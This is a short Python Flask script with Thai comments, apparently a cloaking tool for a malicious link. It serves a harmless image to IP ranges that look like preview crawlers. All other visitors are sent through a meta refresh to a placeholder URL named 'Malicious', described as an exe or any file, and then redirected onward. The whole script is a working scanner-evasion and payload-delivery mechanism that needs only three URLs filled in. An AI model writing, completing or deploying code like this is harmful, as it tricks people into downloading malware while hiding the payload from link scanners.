import requests, io
from flask import Flask, request, send_file
app = Flask(
__name__,
  template_folder='templates',
  static_folder='static'
)

@app.route('/', methods=['GET'])
def main():
  Image = '' # ลิ้งก์รูปที่เราต้องการ
  Malicious = ''# ลิ้งก์ไฟล์ exe หรืออะไรก็ได้
  Redirect = "" # ลิ้งก์ที่ต้องการให้ Redirect ไป
 
  if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
    ip = request.environ['REMOTE_ADDR']
  else:ip = request.environ['HTTP_X_FORWARDED_FOR']
  print(ip)
  if ip.startswith('35.') or ip.startswith('34.'):
    return send_file(
    io.BytesIO(requests.get(Image).content),
    mimetype='image/jpeg',
    download_name='AnyName.png')
  else:
    return f'''<meta http-equiv="refresh" content="0; url={Malicious}">
               '''+'''
          <script>setTimeout(function() {
            ''' + f'window.location = "{Redirect}"''''
          }, 500)</script>''' 
if __name__ == '__main__':

  app.run(
  host='0.0.0.0',
  debug=True,
  port=8080
  )




  #ไม่ใช่ของกู
